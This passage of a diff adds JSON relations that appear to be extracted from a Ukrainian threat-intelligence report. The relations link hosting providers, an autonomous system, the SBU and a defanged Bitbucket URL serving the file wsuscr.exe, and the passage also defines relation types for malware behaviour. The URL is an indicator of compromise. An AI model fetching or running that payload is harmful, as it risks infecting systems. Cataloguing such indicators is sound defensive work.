+      "type": "assigned-to",
+      "tail": "STARK INDUSTRIES SOLUTIONS LTD",
+      "evidence": "автономної системи AS44477 (STARK INDUSTRIES SOLUTIONS LTD)"
+    },
+    {
+      "head": "Shinjiru",
+      "type": "located-in",
+      "tail": "Малайзія",
+      "evidence": "малайзійського хостинг-провайдера Shinjiru"
+    },
+    {
+      "head": "СБУ",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "Запит СБУ"
+    },
+    {
+      "head": "hXXps://bitbucket[.]org/olegovich-007/777/downloads/wsuscr.exe",
+      "type": "hosts",
+      "tail": "wsuscr.exe",
+      "evidence": "hXXps://bitbucket[.]org/olegovich-007/777/downloads/wsuscr.exe"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "contains",
+      "definition": "The subject archive or container file encapsulates the object file or data."
+    },
+    {
+      "name": "downloads-and-executes",
+      "definition": "The subject program downloads and runs the target payload or executable."
+    },
+    {
+      "name": "obfuscated-with",
+      "definition": "The subject payload or executable has been protected or obfuscated using the object software/tool."
+    },
+    {
+      "name": "decrypts-and-executes",
+      "definition": "The subject executable unpacks, decrypts, and executes the target payload."
+    },
+    {
+      "name": "installs",
+      "definition": "The subject installer or dropper installs or infects the system with the target malware."
+    },
+    {
+      "name": "deploys-infrastructure-on",
+      "definition": "The threat actor provisions or utilizes hosting or network infrastructure provided by the target entity."
+    },
+    {
+      "name": "assigned-to",
+      "definition": "The subject network resource or autonomous system is registered or operated by the target organization."
+    },
+    {
+      "name": "located-in",
+      "definition": "The subject entity is geographically situated in or operates from the target country."
+    },
+    {
+      "name": "hosts",
+      "definition": "The subject URL or web location serves or stores the object file."
+    }
+  ]
+}
